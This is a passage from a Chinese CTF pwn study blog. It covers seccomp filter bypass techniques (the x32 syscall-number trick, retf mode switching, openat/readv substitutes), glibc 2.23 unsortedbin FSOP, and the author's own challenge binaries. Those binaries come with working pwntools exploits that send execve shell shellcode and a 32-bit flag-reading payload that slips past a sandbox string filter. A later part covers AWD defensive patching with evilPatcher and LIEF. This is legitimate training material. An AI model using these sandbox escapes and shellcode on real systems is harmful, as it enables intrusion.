SCMP_CMP_EQ , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_MASKED_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the masked argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the masked datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_MASKED_EQ , mask , datum )</span><br></pre></td></tr></table></figure><p>seccomp_load 其实就是应用 filter</p><h2 id="CTF中常见的seccomp"><a href="#CTF中常见的seccomp" class="headerlink" title="CTF中常见的seccomp"></a>CTF中常见的seccomp</h2><h3 id="1—禁用execve"><a href="#1—禁用execve" class="headerlink" title="1—禁用execve"></a>1—禁用execve</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0000:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">arch</span></span><br><span class="line"><span class="attr">0001:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xc000003e</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="string">ARCH_X86_64)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0002:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">sys_number</span></span><br><span class="line"><span class="attr">0003:</span> <span class="number">0x35</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">&gt;=</span> <span class="number">0x40000000</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0004:</span> <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execve)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0005:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="string">return</span> <span class="string">ALLOW</span></span><br><span class="line"><span class="attr">0006:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">return</span> <span class="string">KILL</span></span><br></pre></td></tr></table></figure><p>这种可以通过 open read write 来读取flag</p><h3 id="2—禁用execve-open-write-read"><a href="#2—禁用execve-open-write-read" class="headerlink" title="2—禁用execve,open,write,read"></a>2—禁用execve,open,write,read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了openat，所以直接 调用openat，然后除了 read，write，其实还有两个</p><p>readv，和writev，这些就能绕过限制读取flag,有些连openat都禁用的可以 ptrace 修改syscall</p><h3 id="3—禁用execve-控制open-write-read的参数"><a href="#3—禁用execve-控制open-write-read的参数" class="headerlink" title="3—禁用execve,控制open,write,read的参数"></a>3—禁用execve,控制open,write,read的参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0b</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x4</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>限制参数的,可以在参数上找关键点</p><h3 id="4—限制sys-number"><a href="#4—限制sys-number" class="headerlink" title="4—限制sys_number"></a>4—限制sys_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>没有判断<code>if (A &lt; 0x40000000)</code></p><p>导致了可以 0x40000000+sys_number绕过，sys_number |= 0x40000000</p><p>同样如果没有判断<code>if(A != ARCH_X86_64)</code></p><p>这个可以同32位的shellcode绕过过</p><h2 id="通过切换模式来绕过PWN题中对系统调用的拦截"><a href="#通过切换模式来绕过PWN题中对系统调用的拦截" class="headerlink" title="通过切换模式来绕过PWN题中对系统调用的拦截"></a>通过切换模式来绕过PWN题中对系统调用的拦截</h2><p><strong>retf</strong>是一条远转移指令，等价于pop cs; pop ip，这条指令一般来说可以在libc中找到，但为什么它能修改程序的模式呢，实际上是因为它修改了cs段寄存器。</p><p><strong>cs寄存器</strong>即code segment寄存器，指向存放代码的内存段，在8086的实模式下，指令的寻址为cs:ip-&gt;cs *16 + ip。在32位保护模式下，cpu地址总线和通用寄存器都达到了32位，可以直接访问4GB的内存，段寄存器被赋予了新的任务：保存段描述符的索引即段选择符(segment descriptor)</p><pre><code>                +--------------------------------------+                |         index                 |T|    |                |                               |I|RPL |                +--------------------------------^--^--+                                                 |  |                   Table indicator+--------------+  |                     0 GDT                          |                     1 LDT                          |                  Request Privilege Level+----------+                    </code></pre><p>段选择符的低两位用来表示特权级0-3，第3位表示对应的描述符是位于GDT or LDT，高15位则是下标。在段描述符里，保存有更多的该段的参数信息，包括段基址、粒度、属性、模式等等，</p><p>以64为模式切换到32位模式为例，为了实现模式的切换，我们需要找到一个合适的段选择符，它指向GDT中的一个32位的段描述符。</p><p>在linux x86_x64中，<strong>0x23是一个32位的代码段选择符</strong>（位于GDT），<strong>0x33是一个64位长模式的代码段选择符</strong>。所以在模式切换时，只需用retf指令将cs寄存器的值由0x33改为0x23即可。</p><p>另外需要注意的是，由于程序从64位切换到了32位，<strong>所以各个通用寄存器的使用发生了变化，从原来的8字节变成了只使用低4字节</strong>，特别对于栈寄存器<strong>esp</strong>来说，它是rsp的低4字节，原先的rsp保存着可以被正常访问的栈地址，但这个地址的低4字节大概率为一个不可访问的地址，<strong>所以在执行retf之前，还需要进行栈迁移</strong>，只要通过rop控制rbp后进行两次连续的leave指令就可以实现。</p><p>在Linux中，除了FS、GS需要设置段基址用于访问TLS之外，其余的段寄存器对应的段描述符中的段基址都被置为了0，也就是直接使用偏移作为内存访问的绝对地址，所以只要控制好指令指针寄存器，模式切换时就不会出现控制流的失控。</p><h1 id="任务Ⅲ—-unsorted相关"><a href="#任务Ⅲ—-unsorted相关" class="headerlink" title="任务Ⅲ—-unsorted相关"></a>任务Ⅲ—-unsorted相关</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>glibc2.23下,unsortedbin的利用主要与fsop结合在一起</p><p>利用unsortedbin attack往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><h1 id="任务Ⅳ—-出题"><a href="#任务Ⅳ—-出题" class="headerlink" title="任务Ⅳ—-出题"></a>任务Ⅳ—-出题</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc shellcode.c -o shellcode -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input shellcode!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,shellcode,<span class="number">18</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(shellcode)==<span class="number">2</span>)</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能读取18个字节的shellcode小于最短的shellcode</p><p>同时shellcode长度只能为2,通过jmp绕过</p><p>构造二次read读入到刚好执行到的位置</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p= process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">payload =<span class="string">b&#x27;\xEB\xFF\x00\x31\xFF\x48\xC7\xC6\x72\x40\x40\x00\xB2\x40\x31\xC0\x0F\x05&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;shellcode!&#x27;</span>,payload)</span><br><span class="line">p.send(<span class="string">b&#x27;\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g sandbox.c -o sandbox -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span> &#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_open, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_read, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_write, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_exit, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_exit_group, <span class="number">0</span>);</span><br><span class="line">seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">removeflag</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *sub)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(sub);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p = str;</span><br><span class="line">    <span class="keyword">while</span> ((p = <span class="built_in">strstr</span>(p, sub)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        memmove(p, p + len, <span class="built_in">strlen</span>(p + len) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *sub = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,shellcode,<span class="number">0x100</span>);</span><br><span class="line">    removeflag(shellcode,sub);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只是在开启沙盒后过滤了一次’flag’字符串,绕过即可</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./sandbox&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x0</span></span><br><span class="line"><span class="string">push 0x67616c67</span></span><br><span class="line"><span class="string">push 0x616c6666</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x64</span></span><br><span class="line"><span class="string">mov eax,3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,1</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x64</span></span><br><span class="line"><span class="string">mov eax,4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Hello!&#x27;</span>,asm(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SunmerCamp2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awd-awdp笔记</title>
      <link href="/posts/32516/"/>
      <url>/posts/32516/</url>
      
        <content type="html"><![CDATA[<h1 id="关于awd-amp-awdp"><a href="#关于awd-amp-awdp" class="headerlink" title="关于awd&amp;awdp"></a>关于awd&amp;awdp</h1><p>目前只参加过一场awdp,想过去二者差距应该不会太大</p><p>其各自又分为check和attack,后者就是平常的做题</p><p>而要想快速高效的得分主要是靠check</p><p>不同比赛check机制可能会有些许不同,但有一些较为通用的方式</p><h1 id="0x1通防-seccomp"><a href="#0x1通防-seccomp" class="headerlink" title="0x1通防-seccomp"></a>0x1通防-seccomp</h1><p>总体思路是在不影响程序本身运行的前提下手动给程序禁用一些系统调用</p><p>推荐工具 <strong>↓</strong></p><h2 id="evilPatcher"><a href="#evilPatcher" class="headerlink" title="evilPatcher"></a>evilPatcher</h2><p>其是一个python2脚本</p><p>特点:</p><ul><li>修改的字节数少，0x100字节以下</li><li>不修改文件头信息</li><li>沙箱规则可以自己定义</li><li>支持i386和amd64</li><li>支持pie开启和未开启情况</li></ul><p><strong>其sandboxs文件夹中存储沙盒规则</strong></p><p>用法</p><p><code>python2 evilPatcher.py elfFile sandboxFile-path</code></p><p><code>python2 evilPatcher.py elfFile sandboxFile-path 1</code>会有详细中间过程</p><p>已自动识别32位和64位与pie</p><p> 结果输出一个patch过后的文件，文件名为原来文件加上.patch后缀</p><p><a href="https://github.com/TTY-flag/evilPatcher">github项目地址</a></p><h1 id="0x2LIEF"><a href="#0x2LIEF" class="headerlink" title="0x2LIEF"></a>0x2LIEF</h1><p><code>LIEF</code>是一个能够用于对各种类型的可执行文件（包括Linux ELF文件、Windows exe文件、Android Dex文件等）进行转换、提取、修改的项目，能够在Python、C++和C语言中调用其API进行简单便捷的可执行文件相关操作。</p><p>当不能简单地通过在IDA中修改指令的方式patch时，就需要使用LIEF工具完成patch。</p><p>一般使用其python包</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="程序加载重建"><a href="#程序加载重建" class="headerlink" title="程序加载重建"></a>程序加载重建</h3><p>调用lief.ELF.parse() 函数加载一个可执行文件。如果输入的文件为ELF文件，则返回一个lief.ELF.Binary对象。</p><p>例<code>binary=lief.ELF.parse(&#39;./elf&#39;)</code></p><p>重建这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.write(&quot;elf.modified&quot;)</span><br></pre></td></tr></table></figure><h3 id="header字段"><a href="#header字段" class="headerlink" title="header字段"></a>header字段</h3><p>elf的header字段保存有该ELF文件的一些相关信息，</p><p>包括程序的入口地址（binary.header.entrypoint）、程序运行的机器类型（binary.header.machine_type），</p><p>这两个值都是可以直接修改的</p><p>通过对lief项目的python源码进行查看可知header中还保存有以下较为重要的ELF文件的属性</p><p><strong>完整在lief/ELF/Header.py中查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_type：文件类型，表示该文件是一个可执行文件还是库文件还是其他文件。</span><br><span class="line">header_size：ELF文件头部的长度。</span><br><span class="line">identity：ELF的前几个字节的值，用于标识ELF类型。</span><br><span class="line">identity_class：ELF程序的类型。</span><br><span class="line">identity_data：数据表示方式（大端序或小端序）</span><br><span class="line">numberof_sections：section（节）的数量</span><br><span class="line">numberof_segments：segment（段）的数量（一个segment中包含至少一个section）</span><br></pre></td></tr></table></figure><h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dtor_functions：析构函数列表。</span><br><span class="line">functions：函数列表。</span><br><span class="line">imagebase：ELF文件的加载基地址，在64位程序下，不开启PIE时Image Base=0x401000，开启后在程序开始执行前动态加载，地址不定。</span><br><span class="line">is_pie：是否开启了PIE。</span><br><span class="line">sections：节列表，迭代器。</span><br><span 